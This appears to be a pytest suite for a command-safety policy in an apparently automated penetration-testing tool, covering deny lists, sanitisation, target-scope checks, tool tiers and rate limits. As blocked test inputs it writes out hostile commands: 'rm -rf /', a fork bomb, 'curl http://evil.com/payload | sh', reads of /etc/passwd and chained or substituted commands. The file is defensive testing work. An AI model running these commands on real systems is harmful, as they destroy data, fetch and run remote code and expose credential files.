"""Tests for core.safety_policy — command validation, scope checking, sanitization."""
import pytest
import sys
from pathlib import Path
from unittest.mock import MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.safety_policy import SafetyPolicy, GLOBAL_DENYLIST, ALLOWED_PIPE_TOOLS


@pytest.fixture
def policy():
    config = MagicMock()
    return SafetyPolicy(config)


class TestGlobalDenylist:
    @pytest.mark.asyncio
    async def test_rm_rf_root_blocked(self, policy):
        result = await policy.validate("rm -rf /", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_shutdown_blocked(self, policy):
        result = await policy.validate("shutdown", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_reboot_blocked(self, policy):
        result = await policy.validate("reboot", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_curl_pipe_sh_blocked(self, policy):
        result = await policy.validate("curl http://evil.com/payload | sh", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_fork_bomb_blocked(self, policy):
        result = await policy.validate(":(){ :|:& };:", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_command_substitution_blocked(self, policy):
        result = await policy.validate("echo $(cat /etc/passwd)", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_backtick_substitution_blocked(self, policy):
        result = await policy.validate("echo `cat /etc/passwd`", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_etc_passwd_blocked(self, policy):
        result = await policy.validate("cat /etc/passwd", "sess-1")
        assert result["approved"] is False

    @pytest.mark.asyncio
    async def test_chmod_777_blocked(self, policy):
        result = await policy.validate("chmod 777 /tmp/target", "sess-1")
        assert result["approved"] is False


class TestSanitizeCommand:
    def test_shell_injection_dollar_subst_returns_empty(self, policy):
        result = policy._sanitize_command("echo $(whoami)")
        assert result == ""

    def test_shell_injection_backtick_returns_empty(self, policy):
        result = policy._sanitize_command("echo `id`")
        assert result == ""

    def test_eval_removed(self, policy):
        result = policy._sanitize_command("eval 'echo test'")
        assert result == ""

    def test_semicolon_chaining_removed(self, policy):
        result = policy._sanitize_command("nmap -sV target.com ; cat /etc/passwd")
        assert ";" not in result
        assert "cat" not in result or "passwd" not in result

    def test_double_ampersand_removed(self, policy):
        result = policy._sanitize_command("nmap target.com && whoami")
        assert "&&" not in result

    def test_or_operator_removed(self, policy):
        result = policy._sanitize_command("nmap target.com || echo fail")
        assert "||" not in result

    def test_safe_pipe_preserved(self, policy):
        result = policy._sanitize_command("nmap target.com | grep open")
        assert "grep" in result

    def test_pipe_to_unapproved_tool_removed(self, policy):
        result = policy._sanitize_command("nmap target.com | bash")
        assert "bash" not in result

    def test_simple_command_preserved(self, policy):
        result = policy._sanitize_command("nmap -sV target.com")
        assert "nmap" in result
        assert "target.com" in result


class TestScopeChecking:
    def test_exact_domain_match(self, policy):
        assert policy._is_in_scope("nmap target.com", ["target.com"]) is True

    def test_subdomain_of_scope_domain(self, policy):
        assert policy._is_in_scope("nmap sub.target.com", ["target.com"]) is True

    def test_different_domain_rejected(self, policy):
        assert policy._is_in_scope("nmap evil.com", ["target.com"]) is False

    def test_substring_bypass_prevented(self, policy):
        assert policy._is_in_scope("curl not-target.com", ["target.com"]) is False

    def test_domain_suffix_bypass_prevented(self, policy):
        assert policy._is_in_scope("curl target.com.evil.com", ["target.com"]) is False

    def test_exact_ip_match(self, policy):
        assert policy._is_in_scope("nmap 192.168.1.1", ["192.168.1.1"]) is True

    def test_different_ip_rejected(self, policy):
        assert policy._is_in_scope("nmap 192.168.1.2", ["192.168.1.1"]) is False

    def test_ip_partial_match_rejected(self, policy):
        assert policy._is_in_scope("nmap 192.168.1.10", ["192.168.1.1"]) is False

    def test_wildcard_scope(self, policy):
        assert policy._is_in_scope("nmap sub.target.com", ["*.target.com"]) is True

    def test_no_target_in_command_passes(self, policy):
        assert policy._is_in_scope("whoami", ["target.com"]) is True

    def test_cidr_scope(self, policy):
        assert policy._is_in_scope("nmap 192.168.1.50", ["192.168.1.0/24"]) is True

    def test_cidr_scope_outside(self, policy):
        assert policy._is_in_scope("nmap 192.168.2.1", ["192.168.1.0/24"]) is False


class TestDomainInScope:
    def test_exact_match(self, policy):
        assert policy._domain_in_scope("target.com", "target.com") is True

    def test_subdomain_match(self, policy):
        assert policy._domain_in_scope("api.target.com", "target.com") is True

    def test_different_domain(self, policy):
        assert policy._domain_in_scope("evil.com", "target.com") is False

    def test_partial_domain_no_match(self, policy):
        assert policy._domain_in_scope("not-target.com", "target.com") is False

    def test_suffix_attack_no_match(self, policy):
        assert policy._domain_in_scope("target.com.evil.com", "target.com") is False


class TestTierSystem:
    def test_recon_tool_is_tier1(self, policy):
        assert policy._determine_tier("nmap") == "tier1"

    def test_active_scan_is_tier2(self, policy):
        assert policy._determine_tier("sqlmap") == "tier2"

    def test_exploit_tool_is_tier3(self, policy):
        assert policy._determine_tier("metasploit") == "tier3"

    def test_unknown_tool_defaults_tier1(self, policy):
        assert policy._determine_tier("unknown_tool") == "tier1"

    def test_impacket_wildcard_tier3(self, policy):
        assert policy._determine_tier("impacket-psexec") == "tier3"


class TestRateLimiting:
    @pytest.mark.asyncio
    async def test_rate_limit_allows_up_to_max(self, policy):
        for i in range(4):
            result = await policy._check_rate_limit("sess-1", "tier1", 4)
            assert result is True

    @pytest.mark.asyncio
    async def test_rate_limit_blocks_over_max(self, policy):
        for i in range(4):
            await policy._check_rate_limit("sess-2", "tier1", 4)
        result = await policy._check_rate_limit("sess-2", "tier1", 4)
        assert result is False

    @pytest.mark.asyncio
    async def test_rate_limit_per_session_isolation(self, policy):
        for i in range(4):
            await policy._check_rate_limit("sess-a", "tier1", 4)
        result = await policy._check_rate_limit("sess-b", "tier1", 4)
        assert result is True
